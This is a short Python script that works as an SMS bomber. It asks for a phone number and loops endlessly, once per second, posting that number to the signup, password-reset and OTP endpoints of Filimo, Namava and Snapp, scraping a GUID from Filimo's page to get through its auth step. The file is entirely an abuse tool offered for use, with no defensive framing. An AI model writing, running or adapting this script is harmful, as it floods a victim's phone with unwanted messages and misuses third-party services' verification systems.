import time

import requests
from bs4 import BeautifulSoup
import re
listsms = []
number = str(input('give me a phonenumber: '))
def send_msg_filmo(num):
    global listsms
    datapost={
    }
    r= requests.get('https://www.filimo.com/signup')

    soup = BeautifulSoup(r.content,'html.parser')
    guid= re.findall('(guid):"(....................................)',str(soup.findAll('script')[2]))
    auth = {guid[0][0]:guid[0][1]}
    rg= requests.post('https://www.filimo.com/api/fa/v1/user/Authenticate/auth',data=auth)
    datapost['temp_id'] = rg.json()['data']['attributes']['temp_id']
    datapost['guid'] = rg.json()['data']['attributes']['GUID']
    datapost['account'] = num
    post = requests.post('https://www.filimo.com/api/fa/v1/user/Authenticate/signin_step1',data=datapost)
    if post.status_code == 200:
        print('filimo sended...')
    else:
        print('filimo not sended...')

def namava(num):
    global listsms
    datalist ={'UserName': "+98"+num}
    r = requests.post('https://www.namava.ir/api/v1.0/accounts/reset-passwords/by-phone/request',data=datalist)
    if r.status_code == 200:
        print('namava sended...')
    else:
        print('namava not sended...')

def snap(num):
    global listsms
    datalist={'cellphone': "+98"+num}
    r = requests.post('https://app.snapp.taxi/api/api-passenger-oauth/v2/otp',data=datalist)
    if r.status_code == 200:
        print('snap sended...')
    else:
        print('snap not sended...')

def tabsi(num):
    global listsms
    datalist = {'credential': {'phoneNumber': num, 'role': "PASSENGER"}}
    r = requests.post('https://api.tapsi.cab/api/v2/user',data=datalist)







num_without_zero = re.findall(r'9.*',number)[0]
print(num_without_zero)
while True:
    send_msg_filmo(number)
    namava(num_without_zero)
    snap(num_without_zero)
    time.sleep(1)